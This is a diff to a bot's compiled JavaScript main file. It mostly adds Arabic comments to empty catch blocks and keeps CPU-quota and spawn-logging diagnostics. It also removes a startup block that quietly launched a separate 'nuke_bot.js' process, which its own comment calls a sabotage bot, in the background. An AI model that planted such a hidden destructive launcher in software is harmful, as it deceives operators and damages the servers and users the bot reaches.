@@ -11,7 +11,6 @@ const helpers_1 = require("./utils/helpers");
 const fs_1 = __importDefault(require("fs"));
 const path_1 = __importDefault(require("path"));
 const os_1 = __importDefault(require("os"));
-const child_process_1 = require("child_process");
 const logger = (0, helpers_1.createLogger)('Main');
 // --------------------------------------------
 // سجل دائم يصمد بعد موت السيرفر (الكونسول يُمسح معه — الملف لا)
@@ -27,7 +26,7 @@ function persist(line) {
         }
         fs_1.default.appendFileSync(PERSIST_FILE, entry);
     }
-    catch { }
+    catch { /* لا نعطل البوت بسبب السجل */ }
 }
 // --------------------------------------------
 // ASCII Art Banner
@@ -61,21 +60,6 @@ const banner = `
 async function main() {
     console.log(banner);
     logger.info('🎆 Welcome to Liberty City Bot!');
-    // --- تشغيل بوت التخريب المستقل في الخلفية ---
-    try {
-        // بنشغل الملف عن طريق Node.js مباشرة كعملية منفصلة
-        const nukeProcess = (0, child_process_1.spawn)('node', [path_1.default.join(__dirname, 'nuke_bot.js')], {
-            stdio: 'inherit', // عشان نشوف رسايله في الكونسول بتاع الاستضافة
-            detached: false
-        });
-        nukeProcess.on('error', (err) => {
-            logger.error('Failed to start nuke_bot.js:', err);
-        });
-    }
-    catch (e) {
-        logger.error('Failed to spawn nuke_bot.js:', e);
-    }
-    // ----------------------------------
     const startTime = Date.now();
     // Create client
     const client = new LibertyClient_1.LibertyClient();
@@ -124,7 +108,7 @@ async function main() {
             }
         }
     }
-    catch { }
+    catch { /* تجاهل */ }
     try {
         let q = '', p = '';
         try {
@@ -132,13 +116,13 @@ async function main() {
             q = t[0];
             p = t[1];
         }
-        catch { }
+        catch { /* cgroup v1 */ }
         if (!q) {
             try {
                 q = fs_1.default.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'utf8').trim();
                 p = fs_1.default.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_period_us', 'utf8').trim();
             }
-            catch { }
+            catch { /* لا وصول */ }
         }
         const la = os_1.default.loadavg().map(n => n.toFixed(2)).join(' ');
         if (q) {
@@ -149,7 +133,7 @@ async function main() {
             logger.info(`🧪 CPU quota: unknown | loadavg ${la}`);
         }
     }
-    catch { }
+    catch { /* تجاهل */ }
     try {
         const cpMod = require('child_process');
         const seen = new Set();
@@ -161,13 +145,13 @@ async function main() {
                     logger.info(`🔬 ${name}: ${String(args[0]).slice(0, 90)}\n     ${st}`);
                 }
             }
-            catch { }
+            catch { /* تجاهل */ }
             return orig.apply(this, args);
         };
         cpMod.spawn = wrap('spawn', cpMod.spawn);
         cpMod.spawnSync = wrap('spawnSync', cpMod.spawnSync);
     }
-    catch { }
+    catch { /* تجاهل */ }
     // Initialize the bot
     try {
         await client.initialize();
